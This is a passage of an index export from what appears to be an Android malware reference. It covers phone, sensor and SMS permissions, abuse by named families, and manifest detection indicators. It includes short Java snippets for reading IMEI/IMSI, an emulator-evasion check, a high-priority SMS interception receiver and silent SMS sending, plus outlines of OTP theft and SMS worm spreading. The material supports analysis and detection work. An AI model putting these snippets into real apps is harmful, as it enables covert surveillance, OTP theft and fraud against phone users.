Correlation","text":"<p>Phone numbers can be used to look up social media profiles, messaging accounts, and banking information.</p>"},{"location":"permissions/phone/read-phone-numbers/#detection","title":"Detection","text":"<p>In the manifest:</p> <pre><code>&lt;uses-permission android:name=\"android.permission.READ_PHONE_NUMBERS\" /&gt;\n</code></pre> <p>Less suspicious than <code>READ_PHONE_STATE</code> since it provides less data, but still enables device identification.</p>"},{"location":"permissions/phone/read-phone-state/","title":"READ_PHONE_STATE","text":"<p>Grants access to telephony state: device identifiers (IMEI, MEID, IMSI), phone number, network operator, SIM state, and active call status. The most widely requested dangerous permission in Android malware history, used primarily for device fingerprinting and tracking across app installs.</p>"},{"location":"permissions/phone/read-phone-state/#technical-details","title":"Technical Details","text":"Attribute Value Permission <code>android.permission.READ_PHONE_STATE</code> Protection Level <code>dangerous</code> Permission Group <code>PHONE</code> Grant Method Runtime permission dialog Introduced API 1"},{"location":"permissions/phone/read-phone-state/#what-it-enables","title":"What It Enables","text":"<p>Access to <code>TelephonyManager</code> methods that return device and network identifiers:</p> Method Returns Restricted Since <code>getDeviceId()</code> IMEI (GSM) / MEID (CDMA) Android 10 <code>getImei()</code> IMEI slot 0/1 Android 10 <code>getSubscriberId()</code> IMSI Android 10 <code>getLine1Number()</code> Phone number (carrier-dependent) Android 11 <code>getSimSerialNumber()</code> ICCID Android 10 <code>getNetworkOperator()</code> MCC+MNC Not restricted <code>getNetworkOperatorName()</code> Carrier name Not restricted <code>getSimOperator()</code> SIM MCC+MNC Not restricted <code>getCallState()</code> Idle/ringing/offhook Android 12 (use callback instead) <pre><code>TelephonyManager tm = (TelephonyManager) getSystemService(TELEPHONY_SERVICE);\nString imei = tm.getImei();\nString imsi = tm.getSubscriberId();\nString phone = tm.getLine1Number();\nString carrier = tm.getNetworkOperatorName();\n</code></pre> <p>The <code>PhoneStateListener</code> (deprecated API 31, replaced by <code>TelephonyCallback</code>) provides real-time call state changes, enabling detection of when the user is on a call, when calls begin and end, and the remote number on incoming calls.</p>"},{"location":"permissions/phone/read-phone-state/#abuse-in-malware","title":"Abuse in Malware","text":""},{"location":"permissions/phone/read-phone-state/#device-fingerprinting","title":"Device Fingerprinting","text":"<p>IMEI and IMSI form a persistent device+SIM fingerprint that survives app reinstalls and factory resets (IMEI) or follows the user across devices (IMSI follows the SIM). Malware uses this to:</p> <ul> <li>Uniquely identify victims in C2 databases</li> <li>Detect analysis environments (emulators return all-zero or sequential IMEIs)</li> <li>Prevent re-enrollment when a device is wiped and re-infected</li> <li>Track devices across different malware campaigns</li> </ul>"},{"location":"permissions/phone/read-phone-state/#emulator-detection","title":"Emulator Detection","text":"<p>Common evasion check:</p> <pre><code>String imei = tm.getImei();\nif (imei == null || imei.equals(\"000000000000000\") || imei.startsWith(\"35291100\")) {\n    return;\n}\n</code></pre> <p>Emulators and analysis sandboxes often return null, zeroed, or well-known default IMEI values. Malware compares against a blocklist and refuses to execute on non-physical devices.</p>"},{"location":"permissions/phone/read-phone-state/#call-state-monitoring","title":"Call State Monitoring","text":"<p>Monitoring <code>CALL_STATE_RINGING</code> and <code>CALL_STATE_OFFHOOK</code> allows malware to:</p> <ul> <li>Detect when the user is busy on a call (timing attacks for social engineering)</li> <li>Trigger call recording when combined with <code>RECORD_AUDIO</code></li> <li>Suppress malicious activity during calls to avoid detection</li> </ul>"},{"location":"permissions/phone/read-phone-state/#sim-swap-detection","title":"SIM Swap Detection","text":"<p>Some banking trojans monitor SIM changes via <code>getSubscriberId()</code> and <code>getSimSerialNumber()</code>. A changed IMSI or ICCID with the same IMEI indicates a SIM swap, which can trigger the malware to exfiltrate new SIM details to C2.</p>"},{"location":"permissions/phone/read-phone-state/#notable-families","title":"Notable Families","text":"Family Usage Pegasus Full telephony state collection as part of device profiling Cerberus / Alien IMEI as victim ID in C2, emulator detection Anubis IMEI-based bot registration, call state monitoring Joker Device fingerprinting for premium subscription fraud FluBot IMEI+carrier info sent to C2 on initial beacon Triada IMEI/IMSI exfiltration for ad fraud attribution GodFather IMEI fingerprinting, post-Soviet language kill switch uses SIM locale Fakecalls Call state monitoring for call interception and redirection SpyNote Full telephony state collection, IMEI-based bot ID Mamont Device fingerprinting for Russian-targeted campaigns"},{"location":"permissions/phone/read-phone-state/#android-version-changes","title":"Android Version Changes","text":"<p>Android 1.0 (API 1): <code>READ_PHONE_STATE</code> introduced. No runtime permission required. Any app with the manifest declaration could read IMEI, IMSI, phone number, and all telephony state.</p> <p>Android 6.0 (API 23): runtime permission required. Granting <code>READ_PHONE_STATE</code> granted the entire PHONE group, including <code>CALL_PHONE</code> and <code>READ_CALL_LOG</code> in early implementations.</p> <p>Android 9 (API 28): <code>READ_CALL_LOG</code> split into its own permission group. <code>READ_PHONE_STATE</code> no longer grants call log access.</p> <p>Android 10 (API 29): <code>getDeviceId()</code>, <code>getImei()</code>, <code>getSubscriberId()</code>, and <code>getSimSerialNumber()</code> restricted to apps with <code>READ_PRIVILEGED_PHONE_STATE</code> (signature|privileged). Third-party apps receive a <code>SecurityException</code>. This was the most significant restriction, eliminating IMEI harvesting for non-system apps.</p> <p>Android 11 (API 30): <code>getLine1Number()</code> requires <code>READ_PHONE_NUMBERS</code> (a separate permission) or the <code>READ_PHONE_STATE</code> permission is insufficient. Further tightened access to phone number.</p> <p>Android 12 (API 31): <code>PhoneStateListener</code> deprecated in favor of <code>TelephonyCallback</code>. Apps targeting API 31+ need <code>READ_PHONE_STATE</code> for call state callbacks but cannot get the incoming number without <code>READ_CALL_LOG</code>.</p> <p>Android 13 (API 33): no new restrictions on <code>READ_PHONE_STATE</code> itself, but Play Store policy enforcement tightened.</p>"},{"location":"permissions/phone/read-phone-state/#post-android-10-alternatives","title":"Post-Android 10 Alternatives","text":"<p>With IMEI access removed, malware adapted:</p> Alternative Identifier Requires Persistence <code>Settings.Secure.ANDROID_ID</code> No permission Resets on factory reset, unique per app signing key <code>ADVERTISING_ID</code> No permission (Play Services) User-resettable <code>Build.SERIAL</code> <code>READ_PHONE_STATE</code> (pre-10), restricted (10+) Hardware-bound Hardware MAC Randomized since Android 10 Not reliable <code>MediaDrm</code> device unique ID No permission Persistent, hardware-bound <p><code>MediaDrm.getPropertyByteArray(\"deviceUniqueId\")</code> with a Widevine provisioning ID has become the preferred fingerprinting method for post-Android 10 malware since it requires no permissions and is hardware-bound.</p>"},{"location":"permissions/phone/read-phone-state/#detection","title":"Detection","text":"<p>In the manifest:</p> <pre><code>&lt;uses-permission android:name=\"android.permission.READ_PHONE_STATE\" /&gt;\n</code></pre> <p>On its own, <code>READ_PHONE_STATE</code> is common in legitimate apps. Strong indicators of abuse include combination with <code>INTERNET</code> and <code>RECEIVE_BOOT_COMPLETED</code>, immediate exfiltration of <code>TelephonyManager</code> data on first launch, and comparison of IMEI values against known emulator patterns in the code.</p> <p>Look for <code>TelephonyManager</code> usage in static analysis, specifically calls to <code>getDeviceId()</code>, <code>getImei()</code>, and <code>getSubscriberId()</code> followed by network operations.</p>"},{"location":"permissions/phone/use-sip/","title":"USE_SIP","text":"<p>Allows using the SIP (Session Initiation Protocol) service for VoIP calls. Minimal security relevance in modern Android.</p>"},{"location":"permissions/phone/use-sip/#technical-details","title":"Technical Details","text":"Attribute Value Permission <code>android.permission.USE_SIP</code> Protection Level <code>dangerous</code> Permission Group <code>PHONE</code> Grant Method Runtime permission dialog Introduced API 9 (Android 2.3)"},{"location":"permissions/phone/use-sip/#what-it-enables","title":"What It Enables","text":"<p>Access to Android's built-in SIP stack for making and receiving VoIP calls.</p> <p>Note: Android's native SIP support has been deprecated since Android 12 (API 31). Most VoIP apps use their own SIP or WebRTC stacks instead.</p>"},{"location":"permissions/phone/use-sip/#abuse-in-malware","title":"Abuse in Malware","text":"<p>Negligible. The native SIP stack is rarely used. VoIP-based attacks would use custom networking code rather than this permission.</p>"},{"location":"permissions/phone/use-sip/#detection","title":"Detection","text":"<p>In the manifest:</p> <pre><code>&lt;uses-permission android:name=\"android.permission.USE_SIP\" /&gt;\n</code></pre> <p>Largely obsolete. Presence in modern apps is unusual.</p>"},{"location":"permissions/sensors/","title":"Sensors Permissions","text":"<p>Access to body sensors like heart rate monitors and step counters. Niche abuse potential: biometric data theft from wearables, health data exfiltration. Primarily relevant to fitness app analysis and targeted surveillance rather than commodity malware.</p>"},{"location":"permissions/sensors/#permissions","title":"Permissions","text":"Permission Abuse Potential BODY_SENSORS Read heart rate, step count, and other biometric data from paired sensors BODY_SENSORS_BACKGROUND Continuous background biometric monitoring"},{"location":"permissions/sensors/#health-data-as-intelligence","title":"Health Data as Intelligence","text":"<p>Body sensor data carries disproportionate value in targeted surveillance. Heart rate variability reveals stress responses during specific meetings or conversations. Sleep pattern disruption indicates anxiety. Sudden changes in step counts or activity levels can signal illness, injury, or changes in routine that are operationally relevant.</p> <p>For high-value targets -- executives, diplomats, journalists -- this data provides a physiological layer of surveillance that the target cannot consciously mask. A person can control what they say on a phone call, but they cannot control their resting heart rate spiking during a conversation about a sensitive topic.</p>"},{"location":"permissions/sensors/#wearable-bridge-attack","title":"Wearable Bridge Attack","text":"<p>The most practical sensor exploitation path is through the companion phone app for a wearable device. When a target pairs a smartwatch or fitness tracker with their phone, the companion app (Fitbit, Samsung Health, Garmin Connect) syncs all health data to the phone. A compromised phone app with <code>BODY_SENSORS</code> can then read this synced data, effectively turning the wearable into a remote biometric sensor without ever compromising the wearable itself.</p> <p>This is particularly effective because:</p> <ul> <li>Wearable companion apps request <code>BODY_SENSORS</code> legitimately, so the permission grant does not look anomalous</li> <li>The wearable collects data continuously, including during sleep</li> <li>Historical data is often cached on the phone, providing weeks or months of biometric history in a single exfiltration</li> </ul>"},{"location":"permissions/sensors/#stalkerware-context","title":"Stalkerware Context","text":"<p>Stalkerware apps abuse <code>BODY_SENSORS_BACKGROUND</code> for continuous heart rate monitoring as a proxy for behavior detection. Elevated heart rate at unexpected times, changes in sleep patterns, or sudden increases in physical activity can trigger alerts to the stalker. This transforms health tracking into behavioral surveillance -- the stalker does not need to know where the target is if they can infer what the target is doing from biometric signals alone.</p>"},{"location":"permissions/sensors/#relevant-families","title":"Relevant Families","text":"<p>Pegasus (NSO Group) has documented sensor access capabilities, reading data from paired wearables as part of its full-device compromise. Given Pegasus operates at the OS level with root or equivalent access, it can bypass the permission model entirely, but the <code>BODY_SENSORS</code> permission remains relevant for understanding what data categories are accessible through legitimate API surfaces that less sophisticated implants must use.</p>"},{"location":"permissions/sensors/body-sensors-background/","title":"BODY_SENSORS_BACKGROUND","text":"<p>Allows accessing body sensor data while the app is in the background. Extends <code>BODY_SENSORS</code> to continuous monitoring without requiring the app to be visible.</p>"},{"location":"permissions/sensors/body-sensors-background/#technical-details","title":"Technical Details","text":"Attribute Value Permission <code>android.permission.BODY_SENSORS_BACKGROUND</code> Protection Level <code>dangerous</code> Grant Method Runtime permission dialog (separate from foreground sensor access) Introduced API 33 (Android 13)"},{"location":"permissions/sensors/body-sensors-background/#what-it-enables","title":"What It Enables","text":"<p>Continuous sensor data collection without user interaction. The app does not need to be in the foreground or show a notification (unlike foreground services for location).</p>"},{"location":"permissions/sensors/body-sensors-background/#abuse-in-malware","title":"Abuse in Malware","text":"<p>Same scenarios as <code>BODY_SENSORS</code> but continuous. Enables 24/7 health monitoring for stalkerware.</p> <p>Introduced in Android 13, mirroring the foreground/background split applied to location in Android 10. Users must grant this separately from foreground sensor access.</p>"},{"location":"permissions/sensors/body-sensors-background/#detection","title":"Detection","text":"<p>In the manifest:</p> <pre><code>&lt;uses-permission android:name=\"android.permission.BODY_SENSORS_BACKGROUND\" /&gt;\n</code></pre> <p>Very few legitimate apps need background body sensor access outside of dedicated health monitoring apps.</p>"},{"location":"permissions/sensors/body-sensors/","title":"BODY_SENSORS","text":"<p>Allows access to body sensor data from paired health devices: heart rate monitors, fitness trackers, and other biometric sensors.</p>"},{"location":"permissions/sensors/body-sensors/#technical-details","title":"Technical Details","text":"Attribute Value Permission <code>android.permission.BODY_SENSORS</code> Protection Level <code>dangerous</code> Permission Group <code>SENSORS</code> Grant Method Runtime permission dialog Introduced API 20 (Android 4.4W)"},{"location":"permissions/sensors/body-sensors/#what-it-enables","title":"What It Enables","text":"<p>Access to <code>SensorManager</code> for body sensor types:</p> Sensor Type Data <code>TYPE_HEART_RATE</code> Heart rate in BPM <code>TYPE_STEP_COUNTER</code> Cumulative step count since last reboot <code>TYPE_STEP_DETECTOR</code> Step detection events <p>Also enables reading health data from paired Wear OS devices and Bluetooth health devices.</p>"},{"location":"permissions/sensors/body-sensors/#abuse-in-malware","title":"Abuse in Malware","text":"<p>Limited abuse in practice. Potential scenarios:</p> <ul> <li>Health data theft: exfiltrate biometric data for blackmail or insurance fraud</li> <li>Activity inference: step counter data reveals when a target is moving, sleeping, or stationary</li> <li>User profiling: heart rate patterns can indicate stress, exercise, or sleep</li> </ul> <p>No major malware families are known to specifically target body sensor data. The attack surface is small compared to other permission groups.</p>"},{"location":"permissions/sensors/body-sensors/#detection","title":"Detection","text":"<p>In the manifest:</p> <pre><code>&lt;uses-permission android:name=\"android.permission.BODY_SENSORS\" /&gt;\n</code></pre> <p>Only expected in fitness, health, and wearable companion apps.</p>"},{"location":"permissions/sms/","title":"SMS Permissions","text":"<p>SMS permissions provide access to send, receive, and read text messages. Heavily regulated by Google Play policy since SMS is one of the most abused permission groups: OTP interception, premium SMS fraud, and worm-like spreading via phishing messages.</p>"},{"location":"permissions/sms/#permissions","title":"Permissions","text":"Permission Abuse Potential READ_SMS Read stored messages, harvest OTPs retroactively RECEIVE_SMS Intercept incoming messages in real-time, suppress notifications SEND_SMS Send messages for premium fraud, phishing distribution, C2 communication RECEIVE_WAP_PUSH Intercept MMS push notifications RECEIVE_MMS Intercept incoming MMS messages"},{"location":"permissions/sms/#play-store-policy","title":"Play Store Policy","text":"<p>Since January 2019, Google restricts SMS and Call Log permissions to apps declared as the default SMS handler or that have an approved use case. Apps that cannot justify the need are rejected. This pushed malware distribution toward sideloading and alternative stores.</p> <p>Malware works around this by:</p> <ul> <li>Using accessibility to read SMS notifications instead of the SMS permission</li> <li>Using notification listener service to intercept OTPs</li> <li>Distributing outside Play Store via smishing (SMS phishing) links</li> </ul>"},{"location":"permissions/sms/#families-by-sms-permission-abuse","title":"Families by SMS Permission Abuse","text":"Family Primary SMS Permissions Technique FluBot <code>SEND_SMS</code>, <code>READ_CONTACTS</code> Worm behavior -- reads the contact list and sends SMS phishing messages to every entry, propagating itself across the victim's social graph Joker (Bread) <code>SEND_SMS</code>, <code>RECEIVE_SMS</code> Premium SMS fraud -- subscribes victims to paid services by sending SMS to premium numbers and intercepting confirmation messages to complete the signup silently Anubis <code>RECEIVE_SMS</code>, <code>READ_SMS</code> Banking trojan -- intercepts OTP codes sent via SMS to bypass two-factor authentication on financial accounts Cerberus <code>RECEIVE_SMS</code>, <code>READ_SMS</code> Banking trojan -- real-time OTP interception with automatic forwarding to C2, also reads stored SMS for account recovery codes BRATA <code>RECEIVE_SMS</code>, <code>READ_SMS</code>, <code>SEND_SMS</code> Banking trojan -- intercepts OTPs, can send SMS to attacker-controlled numbers, performs factory reset via device admin after successful theft Pegasus <code>READ_SMS</code>, <code>RECEIVE_SMS</code> State-sponsored -- full SMS database exfiltration for intelligence collection, not fraud"},{"location":"permissions/sms/#sms-as-c2-channel","title":"SMS as C2 Channel","text":"<p>Some families use SMS for command and control as a fallback when internet connectivity is unavailable or when network-level monitoring makes HTTP/HTTPS C2 too risky:</p> <ul> <li>The operator sends specially formatted SMS messages to the infected device containing encoded commands</li> <li>The implant parses incoming SMS, executes the command, and optionally replies via SMS with results</li> <li>SMS-based C2 is harder to block than domain-based C2 because it does not rely on DNS or IP infrastructure that defenders can sinkhole</li> <li>The tradeoff is visibility -- SMS messages appear in carrier logs and can be intercepted by lawful interception systems, making this channel less covert than encrypted HTTPS</li> </ul> <p>This technique is most common in state-sponsored tooling (FinSpy, early Pegasus variants) where the operator controls or has access to carrier infrastructure, neutralizing the visibility risk.</p>"},{"location":"permissions/sms/#evolution-notification-listeners-replace-sms-permissions","title":"Evolution: Notification Listeners Replace SMS Permissions","text":"<p>Modern families increasingly avoid requesting SMS permissions entirely. Instead, they use <code>NotificationListenerService</code> to read OTP codes as they appear in the notification shade:</p> <ul> <li>No runtime permission required -- the user enables the notification listener through Settings &gt; Apps &gt; Special Access, which malware guides the user toward via overlay or social engineering</li> <li>Broader coverage -- notification listeners capture OTPs from SMS, WhatsApp, email, and authenticator apps through a single access grant</li> <li>Evades Play Store policy -- since the app never requests <code>READ_SMS</code> or <code>RECEIVE_SMS</code>, it does not trigger Google's restricted permission review</li> <li>Families using this approach include Xenomorph, SharkBot, and recent Vultur variants, which have dropped SMS permissions entirely in favor of notification access combined with accessibility services</li> </ul>"},{"location":"permissions/sms/read-sms/","title":"READ_SMS","text":"<p>Allows reading SMS messages stored on the device. Used by malware to intercept one-time passwords (OTPs), read authentication codes, and harvest personal communications. Often combined with <code>RECEIVE_SMS</code> for real-time interception.</p>"},{"location":"permissions/sms/read-sms/#technical-details","title":"Technical Details","text":"Attribute Value Permission <code>android.permission.READ_SMS</code> Protection Level <code>dangerous</code> Permission Group <code>SMS</code> Grant Method Runtime permission dialog Introduced API 1"},{"location":"permissions/sms/read-sms/#what-it-enables","title":"What It Enables","text":"<p>Access to the SMS content provider at <code>content://sms/</code>. The app can read all stored messages: inbox, sent, drafts, and outbox.</p> <pre><code>Cursor cursor = getContentResolver().query(\n    Uri.parse(\"content://sms/inbox\"),\n    new String[]{\"address\", \"body\", \"date\"},\n    null, null, \"date DESC\"\n);\n</code></pre> <p>Each message contains:</p> Field Content <code>address</code> Sender phone number <code>body</code> Message text <code>date</code> Timestamp <code>read</code> Read/unread status <code>type</code> Inbox (1), Sent (2), Draft (3), Outbox (4)"},{"location":"permissions/sms/read-sms/#abuse-in-malware","title":"Abuse in Malware","text":""},{"location":"permissions/sms/read-sms/#otp-interception","title":"OTP Interception","text":"<p>The primary abuse case. Banks and online services send authentication codes via SMS. Malware reads these to complete unauthorized transactions or account takeovers.</p> <p>Two approaches:</p> <ol> <li>Retroactive: <code>READ_SMS</code> to query the SMS database after the OTP arrives</li> <li>Real-time: <code>RECEIVE_SMS</code> with a <code>BroadcastReceiver</code> to intercept messages as they arrive and optionally suppress the notification</li> </ol>"},{"location":"permissions/sms/read-sms/#sms-forwarding","title":"SMS Forwarding","text":"<p>Malware reads all incoming SMS and forwards them to C2. This captures not just OTPs but personal messages, bank transaction alerts, and any SMS-based verification.</p>"},{"location":"permissions/sms/read-sms/#contact-harvesting-via-sms","title":"Contact Harvesting via SMS","text":"<p>Read SMS to extract phone numbers and names from message history, building a contact graph even without <code>READ_CONTACTS</code>.</p>"},{"location":"permissions/sms/read-sms/#notable-families","title":"Notable Families","text":"Family SMS Usage FluBot SMS interception + spreading via SMS phishing Cerberus OTP theft via SMS reading and notification listener Joker Read SMS to confirm premium service subscriptions TrickMo (TrickBot mobile) Real-time SMS forwarding to bypass 2FA BRATA SMS interception for banking fraud"},{"location":"permissions/sms/read-sms/#android-version-changes","title":"Android Version Changes","text":"<p>Android 4.4 (API 19): only the default SMS app can write to the SMS provider. Other apps can still read.</p> <p>Android 6.0 (API 23): runtime permission required. Granting <code>READ_SMS</code> also grants <code>RECEIVE_SMS</code>, <code>RECEIVE_MMS</code>, and <code>RECEIVE_WAP_PUSH</code> (same permission group). This changed in later versions.</p> <p>Android 8.0 (API 26): Google Play policy restricts SMS permissions to apps that need them for core functionality. Apps must be declared as default SMS handler or have an approved use case.</p> <p>Android 10 (API 29): <code>READ_SMS</code> no longer grants automatic access to call log or phone number. Permission groups were split to be more granular.</p> <p>Android 13 (API 33): runtime permission model unchanged, but Play Store review is stricter about justifying SMS access.</p>"},{"location":"permissions/sms/read-sms/#alternatives-used-by-malware","title":"Alternatives Used by Malware","text":"<p>When <code>READ_SMS</code> is difficult to obtain:</p> Alternative How It Works Notification listener Read OTPs from notification text without SMS permission Accessibility service Read SMS notification content from the screen Google Authenticator overlay Phish TOTP codes using overlay on authenticator apps <p>The shift to notification-based OTP interception has reduced reliance on <code>READ_SMS</code> in newer malware families, since <code>BIND_NOTIFICATION_LISTENER_SERVICE</code> is easier to justify and harder for Google Play to flag.</p>"},{"location":"permissions/sms/read-sms/#detection","title":"Detection","text":"<p>In the manifest:</p> <pre><code>&lt;uses-permission android:name=\"android.permission.READ_SMS\" /&gt;\n</code></pre> <p>Combined with <code>RECEIVE_SMS</code>, <code>INTERNET</code>, and <code>RECEIVE_BOOT_COMPLETED</code>, this is a strong indicator of SMS-stealing malware. The presence of a <code>BroadcastReceiver</code> for <code>SMS_RECEIVED</code> with high priority confirms real-time interception intent.</p>"},{"location":"permissions/sms/receive-mms/","title":"RECEIVE_MMS","text":"<p>Allows receiving incoming MMS (Multimedia Messaging Service) messages. MMS carries images, audio, video, and rich text between devices.</p>"},{"location":"permissions/sms/receive-mms/#technical-details","title":"Technical Details","text":"Attribute Value Permission <code>android.permission.RECEIVE_MMS</code> Protection Level <code>dangerous</code> Permission Group <code>SMS</code> Grant Method Runtime permission dialog Introduced API 1"},{"location":"permissions/sms/receive-mms/#what-it-enables","title":"What It Enables","text":"<p>Receive MMS messages containing multimedia content. The app can intercept and process incoming MMS before the default messaging app.</p>"},{"location":"permissions/sms/receive-mms/#abuse-in-malware","title":"Abuse in Malware","text":""},{"location":"permissions/sms/receive-mms/#content-interception","title":"Content Interception","text":"<p>Intercept MMS messages containing photos, videos, or documents. Relevant for surveillance and data exfiltration.</p>"},{"location":"permissions/sms/receive-mms/#historical-stagefright","title":"Historical: Stagefright","text":"<p>The Stagefright vulnerability (CVE-2015-1538 and related) allowed remote code execution through specially crafted MP4 files delivered via MMS. The media framework processed the attached content automatically upon MMS receipt, before the user even opened the message. This was one of the most significant Android vulnerabilities discovered, affecting approximately 950 million devices.</p> <p>Google's response included monthly security patches (the Android Security Bulletin program started partly because of Stagefright) and changes to disable automatic MMS media processing.</p>"},{"location":"permissions/sms/receive-mms/#detection","title":"Detection","text":"<p>In the manifest:</p> <pre><code>&lt;uses-permission android:name=\"android.permission.RECEIVE_MMS\" /&gt;\n</code></pre> <p>Subject to the same Google Play SMS permission restrictions. Rarely requested by modern malware outside of stalkerware.</p>"},{"location":"permissions/sms/receive-sms/","title":"RECEIVE_SMS","text":"<p>Allows receiving incoming SMS messages in real-time via a broadcast receiver. More valuable to attackers than <code>READ_SMS</code> because it captures messages the moment they arrive, enabling OTP interception before the user reads the notification.</p>"},{"location":"permissions/sms/receive-sms/#technical-details","title":"Technical Details","text":"Attribute Value Permission <code>android.permission.RECEIVE_SMS</code> Protection Level <code>dangerous</code> Permission Group <code>SMS</code> Grant Method Runtime permission dialog Introduced API 1"},{"location":"permissions/sms/receive-sms/#what-it-enables","title":"What It Enables","text":"<p>Register a <code>BroadcastReceiver</code> for <code>android.provider.Telephony.SMS_RECEIVED</code>:</p> <pre><code>public class SmsReceiver extends BroadcastReceiver {\n    @Override\n    public void onReceive(Context context, Intent intent) {\n        Bundle bundle = intent.getExtras();\n        Object[] pdus = (Object[]) bundle.get(\"pdus\");\n        for (Object pdu : pdus) {\n            SmsMessage msg = SmsMessage.createFromPdu((byte[]) pdu);\n            String sender = msg.getOriginatingAddress();\n            String body = msg.getMessageBody();\n        }\n    }\n}\n</code></pre> <p>Manifest registration:</p> <pre><code>&lt;receiver android:name=\".SmsReceiver\" android:exported=\"true\"&gt;\n    &lt;intent-filter android:priority=\"999\"&gt;\n        &lt;action android:name=\"android.provider.Telephony.SMS_RECEIVED\" /&gt;\n    &lt;/intent-filter&gt;\n&lt;/receiver&gt;\n</code></pre> <p>The <code>android:priority=\"999\"</code> ensures the malware's receiver runs before the default SMS app.</p>"},{"location":"permissions/sms/receive-sms/#suppressing-messages","title":"Suppressing Messages","text":"<p>On Android &lt; 4.4, any app with <code>RECEIVE_SMS</code> could call <code>abortBroadcast()</code> to prevent the SMS from reaching other receivers, including the default SMS app. The user never sees the message.</p> <p>On Android 4.4+, only the default SMS app can abort. But the malware still reads the content and forwards it to C2. The user may see the message, but the OTP is already stolen.</p>"},{"location":"permissions/sms/receive-sms/#abuse-in-malware","title":"Abuse in Malware","text":""},{"location":"permissions/sms/receive-sms/#real-time-otp-theft","title":"Real-Time OTP Theft","text":"<p>The primary use case. Malware intercepts banking OTPs within milliseconds:</p> <ol> <li>Attacker initiates a fraudulent transaction on the victim's banking account</li> <li>Bank sends OTP via SMS</li> <li>Malware intercepts the SMS before the user reads it</li> <li>Malware forwards OTP to C2</li> <li>Attacker completes the transaction</li> </ol>"},{"location":"permissions/sms/receive-sms/#sms-worm-propagation","title":"SMS Worm Propagation","text":"<p>FluBot used <code>RECEIVE_SMS</code> + <code>SEND_SMS</code> to create a self-spreading worm:</p> <ol> <li>Receive incoming SMS</li> <li>Extract the sender's number</li> <li>Send a phishing SMS to that number with a malicious link</li> <li>New victim installs the malware</li> <li>Repeat</li> </ol>"},{"location":"permissions/sms/receive-sms/#c2-via-sms","title":"C2 via SMS","text":"<p>Some malware uses SMS as a command-and-control channel. The C2 server sends commands via SMS, and the malware receives and executes them. This works even without internet connectivity and is harder to block with network-level security tools.</p>"},{"location":"permissions/sms/receive-sms/#android-version-changes","title":"Android Version Changes","text":"<p>Android 4.4 (API 19): only default SMS app can abort broadcasts or write to SMS provider.</p> <p>Android 8.0 (API 26): implicit broadcast restrictions. <code>SMS_RECEIVED</code> is exempt and still delivered to manifest-registered receivers.</p> <p>Android 10 (API 29): apps must declare specific foreground service types. Background SMS interception still works via manifest-registered receivers.</p>"},{"location":"permissions/sms/receive-sms/#notable-families","title":"Notable Families","text":"<p>Nearly every banking trojan uses <code>RECEIVE_SMS</code> for OTP interception. See Broadcast Theft for the full family list.</p> Family SMS Interception Usage Cerberus 2FA OTP interception, SMS forwarding to C2 Hook OTP interception during ATS fraud GodFather OTP theft across 400+ banking targets Anatsa OTP capture during automated transfers FluBot OTP theft + SMS worm propagation (sends phishing to contacts) TrickMo Originally built as TrickBot's 2FA bypass component SpyNote Full SMS surveillance (read, intercept, forward) Mamont Highest-volume banker in 2024, SMS + notification interception TsarBot OTP capture across 750+ targets"},{"location":"permissions/sms/receive-sms/#detection","title":"Detection","text":"<p>High-priority <code>SMS_RECEIVED</code> receiver in the manifest is the primary indicator. Combined with <code>INTERNET</code> and <code>SEND_SMS</code>, this is strong evidence of SMS-stealing or worm behavior.</p>"},{"location":"permissions/sms/receive-wap-push/","title":"RECEIVE_WAP_PUSH","text":"<p>Allows receiving WAP push messages, which are used to deliver MMS notifications and OMA (Open Mobile Alliance) provisioning messages. Historically abused for premium service subscription fraud and MMS-based exploits.</p>"},{"location":"permissions/sms/receive-wap-push/#technical-details","title":"Technical Details","text":"Attribute Value Permission <code>android.permission.RECEIVE_WAP_PUSH</code> Protection Level <code>dangerous</code> Permission Group <code>SMS</code> Grant Method Runtime permission dialog Introduced API 1"},{"location":"permissions/sms/receive-wap-push/#what-it-enables","title":"What It Enables","text":"<p>Receive <code>WAP_PUSH_RECEIVED</code> broadcasts containing WAP Service Indication (SI) and Service Loading (SL) messages.</p> <p>WAP push messages can:</p> <ul> <li>Deliver MMS download URLs</li> <li>Trigger automatic URL loading (SL messages)</li> <li>Carry OMA provisioning data (network configuration)</li> </ul>"},{"location":"permissions/sms/receive-wap-push/#abuse-in-malware","title":"Abuse in Malware","text":""},{"location":"permissions/sms/receive-wap-push/#wap-billing-fraud","title":"WAP Billing Fraud","text":"<p>Joker (Bread) malware family heavily abused WAP push:</p> <ol> <li>Malware subscribes user to premium WAP billing services</li> <li>WAP push confirmation messages arrive</li> <li>Malware intercepts and confirms them automatically</li> <li>User is charged on their phone bill</li> </ol> <p>This was one of the most persistent Play Store threats. Google removed 1700+ Joker-infected apps over its lifetime.</p>"},{"location":"permissions/sms/receive-wap-push/#mms-exploit-delivery","title":"MMS Exploit Delivery","text":"<p>Stagefright (2015) exploited the media processing pipeline through MMS messages. WAP push delivers the MMS notification, and the media framework automatically processes the attached content. While Stagefright itself was a framework vulnerability (not a permission issue), the WAP push reception path was part of the attack chain.</p>"},{"location":"permissions/sms/receive-wap-push/#detection","title":"Detection","text":"<p>In the manifest:</p> <pre><code>&lt;uses-permission android:name=\"android.permission.RECEIVE_WAP_PUSH\" /&gt;\n</code></pre> <p>Combined with <code>SEND_SMS</code> and <code>RECEIVE_SMS</code>, indicates potential WAP billing fraud. Subject to the same Google Play policy restrictions as other SMS permissions.</p>"},{"location":"permissions/sms/send-sms/","title":"SEND_SMS","text":"<p>Allows sending SMS messages programmatically without user interaction. Used for premium SMS fraud (sending messages to premium-rate numbers), phishing distribution (sending malicious links to victim's contacts), and covert C2 communication.</p>"},{"location":"permissions/sms/send-sms/#technical-details","title":"Technical Details","text":"Attribute Value Permission <code>android.permission.SEND_SMS</code> Protection Level <code>dangerous</code> Permission Group <code>SMS</code> Grant Method Runtime permission dialog Introduced API 1"},{"location":"permissions/sms/send-sms/#what-it-enables","title":"What It Enables","text":"<pre><code>SmsManager smsManager = SmsManager.getDefault();\nsmsManager.sendTextMessage(\"+1234567890\", null, \"message body\", null, null);\n</code></pre> <p>The message is sent without any UI or confirmation dialog. The user may see it appear in their sent messages (depending on Android version and default SMS app behavior).</p> <p>For long messages:</p> <pre><code>ArrayList&lt;String&gt; parts = smsManager.divideMessage(longText);\nsmsManager.sendMultipartTextMessage(number, null, parts, null, null);\n</code></pre>"},{"location":"permissions/sms/send-sms/#abuse-in-malware","title":"Abuse in Malware","text":""},{"location":"permissions/sms/send-sms/#premium-sms-fraud","title":"Premium SMS Fraud","text":"<p>Sending messages to premium-rate short codes that charge the victim's phone bill. Each message costs $1-10. Malware sends messages in the background and may delete sent message records to cover tracks.</p> 